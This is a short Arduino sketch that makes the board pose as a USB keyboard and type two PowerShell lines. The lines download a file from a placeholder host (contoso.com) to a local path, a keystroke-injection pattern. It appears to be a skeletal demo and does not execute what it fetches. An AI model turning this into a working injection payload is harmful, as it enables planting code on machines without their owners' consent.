#include "Keyboard_IT.h"

void setup() {
  // put your setup code here, to run once:
  Serial.begin(115200);

  Keyboard.begin();

  delay(1000);
  
  Keyboard.println("$WebClient = New-Object System.Net.WebClient");
  Keyboard.println("$WebClient.DownloadFile(\"https://www.contoso.com/file\",\"C:\\path\\file\")");
}

void loop() {
  // put your main code here, to run repeatedly:

}
